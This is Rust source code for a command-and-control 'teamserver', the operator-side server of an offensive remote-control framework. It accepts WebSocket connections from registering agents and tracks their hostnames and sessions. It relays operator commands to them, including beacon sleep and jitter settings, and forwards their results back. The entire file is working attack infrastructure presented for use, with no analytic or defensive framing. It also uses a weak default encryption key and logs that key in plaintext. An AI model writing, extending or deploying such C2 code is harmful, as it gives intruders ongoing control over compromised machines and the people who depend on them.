use anyhow::Result;
use clap::Parser;
use rust_c2::{types::*, crypto::*, protocol::*, utils::*};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;
use tokio::net::{TcpListener, TcpStream};
use tokio_tungstenite::accept_async;
use chrono::Utc;
use serde_json;

#[derive(Parser)]
#[command(name = "teamserver")]
#[command(about = "Rust C2 Teamserver - Command and Control Server")]
struct Cli {
    #[arg(short, long, default_value = "127.0.0.1")]
    bind: String,
    
    #[arg(short, long, default_value = "8080")]
    port: u16,
    
    #[arg(short, long, default_value = "default-key-change-in-production")]
    key: String,
}

struct C2Teamserver {
    config: ServerConfig,
    encryption_key: EncryptionKey,
    session_manager: Arc<Mutex<SessionManager>>,
    connections: Arc<Mutex<HashMap<AgentId, mpsc::Sender<Message>>>>,
}

impl C2Teamserver {
    fn new(config: ServerConfig) -> Result<Self> {
        let encryption_key = EncryptionKey::new(&config.encryption_key)?;
        let mut session_manager = SessionManager::new();
        
        // Try to load existing sessions from file
        if let Ok(session_data) = std::fs::read_to_string("sessions.json") {
            if let Ok(sessions) = serde_json::from_str::<Vec<Session>>(&session_data) {
                println!("[DEBUG] Loading {} sessions from file", sessions.len());
                for session in sessions {
                    session_manager.add_session(session.agent_id, session);
                }
            }
        }
        
        let session_manager = Arc::new(Mutex::new(session_manager));
        let connections = Arc::new(Mutex::new(HashMap::new()));
        
        Ok(Self {
            config,
            encryption_key,
            session_manager,
            connections,
        })
    }
    
    async fn start(&mut self) -> Result<()> {
        let addr = format!("{}:{}", self.config.bind_address, self.config.port);
        log_success("teamserver", &format!("Starting C2 teamserver on {}", addr));
        println!("Starting C2 teamserver on {}", addr);
        
        let listener = TcpListener::bind(&addr).await?;
        log_success("teamserver", &format!("Teamserver listening on {}", addr));
        println!("Teamserver listening on {}", addr);
        
        let session_manager = Arc::clone(&self.session_manager);
        let encryption_key = self.encryption_key.clone();
        let connections = Arc::clone(&self.connections);
        
        // Accept connections
        while let Ok((stream, addr)) = listener.accept().await {
            log_info("teamserver", &format!("New connection from: {}", addr));
            println!("New connection from: {}", addr);
            
            let session_manager = Arc::clone(&session_manager);
            let encryption_key = encryption_key.clone();
            let connections = Arc::clone(&connections);
            
            tokio::spawn(async move {
                if let Err(e) = Self::handle_connection(stream, encryption_key, session_manager, connections).await {
                    log_error("teamserver", &format!("Connection error: {}", e));
                    eprintln!("Connection error: {}", e);
                }
            });
        }
        
        Ok(())
    }
    
    fn write_sessions_to_file(&self) {
        if let Ok(sm) = self.session_manager.lock() {
            let sessions: Vec<&Session> = sm.get_all_sessions().values().collect();
            match serde_json::to_string_pretty(&sessions) {
                Ok(json) => {
                    match std::fs::write("sessions.json", &json) {
                        Ok(_) => {
                            let ids: Vec<_> = sessions.iter().map(|s| s.agent_id).collect();
                            println!("[DEBUG][write_sessions_to_file] Wrote {} sessions: {:?}", sessions.len(), ids);
                        },
                        Err(e) => {
                            eprintln!("[ERROR][write_sessions_to_file] Failed to write sessions.json: {}", e);
                        }
                    }
                },
                Err(e) => {
                    eprintln!("[ERROR][write_sessions_to_file] Failed to serialize sessions: {}", e);
                }
            }
        } else {
            eprintln!("[ERROR][write_sessions_to_file] Failed to acquire session manager lock");
        }
    }
    
    async fn handle_connection(
        stream: TcpStream,
        encryption_key: EncryptionKey,
        session_manager: Arc<Mutex<SessionManager>>,
        connections: Arc<Mutex<HashMap<AgentId, mpsc::Sender<Message>>>>,
    ) -> Result<()> {
        println!("[DEBUG] Accepting WebSocket upgrade");
        let ws_stream = accept_async(stream).await?;
        println!("[DEBUG] WebSocket upgrade successful");
        let mut connection = ServerConnectionPlain::new(ws_stream, encryption_key.clone());
        
        // Create a channel for this connection
        let (tx, mut rx) = mpsc::channel::<Message>(10);
        let mut agent_id: Option<AgentId> = None;
        let mut is_client = false;
        
        println!("🔗 New WebSocket connection established");
        
        let teamserver = C2Teamserver {
            config: ServerConfig::default(),
            encryption_key: encryption_key.clone(),
            session_manager: Arc::clone(&session_manager),
            connections: Arc::clone(&connections),
        };
        
        loop {
            tokio::select! {
                // Outgoing messages from server to agent/client
                maybe_msg = rx.recv() => {
                    if let Some(message) = maybe_msg {
                        println!("[DEBUG] Sending message: {:?}", message);
                        if let Err(e) = connection.send_message(&message).await {
                            eprintln!("Failed to forward message: {}", e);
                        } else {
                            println!("[DEBUG] Message sent successfully");
                        }
                    } else {
                        // Channel closed
                        println!("[DEBUG] Channel closed, breaking connection loop");
                        break;
                    }
                }
                // Incoming messages from agent/client
                result = connection.receive_message() => {
                    println!("[DEBUG] Waiting for message...");
                    match result {
                        Ok(Some(message)) => {
                            println!("[DEBUG] Received message: {:?}", message);
                            match message {
                                Message::Register { agent_info } => {
                                    // This is an agent registering
                                    let agent_id_val = agent_info.id;
                                    agent_id = Some(agent_id_val);
                                    is_client = false;
                                    
                                    // Store the connection
                                    {
                                        if let Ok(mut connections) = connections.lock() {
                                            connections.insert(agent_id_val, tx.clone());
                                        } else {
                                            eprintln!("Failed to acquire connections lock");
                                        }
                                    }
                                    
                                    // Register the session
                                    {
                                        if let Ok(mut sm) = session_manager.lock() {
                                            let session = Session {
                                                agent_id: agent_id_val,
                                                agent_info: agent_info.clone(),
                                                last_heartbeat: Utc::now(),
                                                status: AgentStatus::Online,
                                                pending_commands: HashMap::new(),
                                                sleep_duration: None,
                                                sleep_jitter: None,
                                            };
                                            sm.add_session(agent_id_val, session);
                                            println!("[DEBUG][teamserver] Called add_session for agent_id: {}", agent_id_val);
                                        } else {
                                            eprintln!("Failed to acquire session manager lock");
                                        }
                                    }
                                    
                                    println!("✅ Agent registered: {} ({})", agent_info.hostname, agent_id_val);
                                    teamserver.write_sessions_to_file();
                                }
                                Message::Command { command_id, command } => {
                                    // If this is the first message and it's a command, it's likely a client
                                    if agent_id.is_none() {
                                        is_client = true;
                                        println!("[DEBUG] Identified connection as client");
                                        
                                        // Store the client connection using a special client ID
                                        {
                                            if let Ok(mut connections) = connections.lock() {
                                                use uuid::Uuid;
                                                let client_id = Uuid::nil(); // Use nil UUID for client
                                                connections.insert(client_id, tx.clone());
                                                println!("[DEBUG] Stored client connection with ID: {}", client_id);
                                            } else {
                                                eprintln!("Failed to acquire connections lock for client storage");
                                            }
                                        }
                                    }
                                    
                                    println!("[DEBUG] Received Command message, is_client: {}, agent_id: {:?}", is_client, agent_id);
                                    
                                    // This is a client sending a command to an agent
                                    if is_client {
                                        // Use the agent_id from the connection to target the specific agent
                                        if let Some(target_agent_id) = connection.get_agent_id() {
                                            println!("[DEBUG] Client sent command: {:?} to agent {}", command, target_agent_id);
                                            
                                            // Send the command to the specific agent
                                            if let Ok(connections) = connections.lock() {
                                                if let Some(tx) = connections.get(&target_agent_id) {
                                                    println!("[DEBUG] Forwarding command to agent: {}", target_agent_id);
                                                    let message = Message::Command { command_id, command };
                                                    if let Err(e) = tx.try_send(message) {
                                                        eprintln!("Failed to send command to agent: {}", e);
                                                    } else {
                                                        println!("✅ Command forwarded to agent: {}", target_agent_id);
                                                    }
                                                } else {
                                                    println!("❌ Agent {} not found or not connected", target_agent_id);
                                                }
                                            } else {
                                                eprintln!("Failed to acquire connections lock");
                                            }
                                        } else {
                                            println!("❌ No target agent specified for command");
                                        }
                                    } else {
                                        // This is an agent receiving a command (normal flow)
                                        println!("📨 Received command from client: {:?}", command);
                                    }
                                }
                                Message::Heartbeat { agent_id: heartbeat_agent_id, .. } => {
                                    if !is_client {
                                        println!("[DEBUG] Received heartbeat from agent: {}", heartbeat_agent_id);
                                        // Update last heartbeat
                                        {
                                            if let Ok(mut sm) = session_manager.lock() {
                                                if let Some(session) = sm.get_session_mut(&heartbeat_agent_id) {
                                                    session.last_heartbeat = Utc::now();
                                                }
                                            } else {
                                                eprintln!("Failed to acquire session manager lock for heartbeat");
                                            }
                                        }
                                        teamserver.write_sessions_to_file();
                                    }
                                }
                                Message::Response { command_id: resp_command_id, response } => {
                                    if !is_client {
                                        println!("📨 Received response from agent {}: {:?}", 
                                            agent_id.unwrap_or_default(), response);
                                        
                                        // Forward the response back to all clients (since we don't track which client sent which command)
                                        // This is a simple approach - in a more sophisticated system, you'd track command origins
                                        if let Ok(connections) = connections.lock() {
                                            println!("[DEBUG] Found {} connections to forward response to", connections.len());
                                            for (conn_id, tx) in connections.iter() {
                                                // Skip the agent that sent the response
                                                if conn_id != &agent_id.unwrap_or_default() {
                                                    println!("[DEBUG] Attempting to forward response to connection: {}", conn_id);
                                                    let response_msg = Message::Response { 
                                                        command_id: resp_command_id, 
                                                        response: response.clone() 
                                                    };
                                                    if let Err(e) = tx.try_send(response_msg.clone()) {
                                                        println!("[DEBUG] Failed to forward response to connection {}: {}", conn_id, e);
                                                    } else {
                                                        println!("[DEBUG] Successfully forwarded response to connection: {}", conn_id);
                                                    }
                                                } else {
                                                    println!("[DEBUG] Skipping agent connection: {}", conn_id);
                                                }
                                            }
                                        } else {
                                            eprintln!("Failed to acquire connections lock for response forwarding");
                                        }
                                    } else {
                                        // Client received a response
                                        println!("📨 Received response: {:?}", response);
                                    }
                                }
                                Message::ListAgentsRequest => {
                                    // Gather all online agents with sleep information
                                    let agents = if let Ok(sm) = session_manager.lock() {
                                        sm.get_all_sessions()
                                            .values()
                                            .filter(|s| matches!(s.status, AgentStatus::Online))
                                            .map(|s| AgentInfoExtended {
                                                agent_info: s.agent_info.clone(),
                                                sleep_duration: s.sleep_duration,
                                                sleep_jitter: s.sleep_jitter,
                                            })
                                            .collect::<Vec<_>>()
                                    } else {
                                        vec![]
                                    };
                                    let response = Message::ListAgentsResponse { agents };
                                    if let Err(e) = connection.send_message(&response).await {
                                        eprintln!("Failed to send ListAgentsResponse: {}", e);
                                    }
                                }
                                Message::RelayCommand { agent_id: target_agent_id, command_id, command } => {
                                    // Relay command from client to agent
                                    log_info("teamserver", &format!("Relaying command from client to agent {}", target_agent_id));
                                    log_debug("teamserver", &format!("Command type: {:?}", command));
                                    println!("[DEBUG] Relaying command from client to agent {}", target_agent_id);
                                    println!("[DEBUG] Current agent_id: {:?}, is_client: {}", agent_id, is_client);
                                    
                                    // Store the client connection if this is the first message from this connection
                                    if agent_id.is_none() {
                                        is_client = true;
                                        println!("[DEBUG] Identified connection as client (via RelayCommand)");
                                        
                                        // Store the client connection using a special client ID
                                        {
                                            if let Ok(mut connections) = connections.lock() {
                                                use uuid::Uuid;
                                                let client_id = Uuid::nil(); // Use nil UUID for client
                                                connections.insert(client_id, tx.clone());
                                                println!("[DEBUG] Stored client connection with ID: {}", client_id);
                                            } else {
                                                eprintln!("Failed to acquire connections lock for client storage");
                                            }
                                        }
                                    } else {
                                        println!("[DEBUG] Client connection not stored - agent_id is not None: {:?}", agent_id);
                                    }
                                    
                                    // Always ensure client connection is stored for RelayCommand messages
                                    if is_client {
                                        println!("[DEBUG] Ensuring client connection is stored for RelayCommand");
                                        if let Ok(mut connections) = connections.lock() {
                                            use uuid::Uuid;
                                            let client_id = Uuid::nil(); // Use nil UUID for client
                                            if !connections.contains_key(&client_id) {
                                                connections.insert(client_id, tx.clone());
                                                println!("[DEBUG] Stored client connection with ID: {}", client_id);
                                            } else {
                                                println!("[DEBUG] Client connection already exists");
                                            }
                                        } else {
                                            eprintln!("Failed to acquire connections lock for client storage");
                                        }
                                    }
                                    if let Ok(connections) = connections.lock() {
                                        if let Some(tx) = connections.get(&target_agent_id) {
                                            // Check if this is a sleep command before moving the command
                                            let is_sleep_command = if let CommandType::Sleep { duration, jitter_percent } = &command {
                                                // Update session information for sleep commands
                                                if let Ok(mut sm) = session_manager.lock() {
                                                    if let Some(session) = sm.get_session_mut(&target_agent_id) {
                                                        session.sleep_duration = Some(*duration);
                                                        session.sleep_jitter = Some(*jitter_percent);
                                                        println!("✅ Updated session sleep settings for agent {}", target_agent_id);
                                                    }
                                                } else {
                                                    eprintln!("Failed to acquire session manager lock for sleep command");
                                                }
                                                teamserver.write_sessions_to_file();
                                                true
                                            } else {
                                                false
                                            };
                                            
                                            let message = Message::Command { command_id, command };
                                            if let Err(e) = tx.try_send(message) {
                                                eprintln!("Failed to send relayed command to agent: {}", e);
                                            } else {
                                                println!("✅ Relayed command to agent: {}", target_agent_id);
                                            }
                                        } else {
                                            println!("❌ Agent {} not found or not connected", target_agent_id);
                                        }
                                    } else {
                                        eprintln!("Failed to acquire connections lock for relay");
                                    }
                                }
                                _ => {
                                    println!("📨 Received message: {:?}", message);
                                }
                            }
                        }
                        Ok(None) => {
                            println!("Connection closed");
                            break;
                        }
                        Err(e) => {
                            eprintln!("Error receiving message: {}", e);
                            break;
                        }
                    }
                }
            }
        }
        
        // Clean up on disconnect
        if let Some(id) = agent_id {
            if !is_client {
                println!("[DEBUG] Cleaning up agent session: {}", id);
                {
                    if let Ok(mut connections) = connections.lock() {
                        connections.remove(&id);
                    } else {
                        eprintln!("Failed to acquire connections lock for cleanup");
                    }
                }
                {
                    if let Ok(mut sm) = session_manager.lock() {
                        if let Some(session) = sm.get_session_mut(&id) {
                            session.status = AgentStatus::Offline;
                        }
                    } else {
                        eprintln!("Failed to acquire session manager lock for cleanup");
                    }
                }
                teamserver.write_sessions_to_file();
            }
        }
        
        Ok(())
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();
    
    // Initialize logging
    log_info("teamserver", "Starting C2 teamserver");
    
    let config = ServerConfig {
        bind_address: cli.bind.clone(),
        port: cli.port,
        encryption_key: cli.key.clone(),
        heartbeat_interval: 30,
        command_timeout: 300,
        max_agents: 1000,
        log_level: "info".to_string(),
    };
    
    log_info("teamserver", &format!("Configuration: bind={}:{}, key={}", cli.bind, cli.port, cli.key));
    
    let mut teamserver = C2Teamserver::new(config)?;
    log_success("teamserver", "Teamserver initialized successfully");
    println!("Teamserver running. Use the client to interact.");
    teamserver.start().await?;
    Ok(())
} 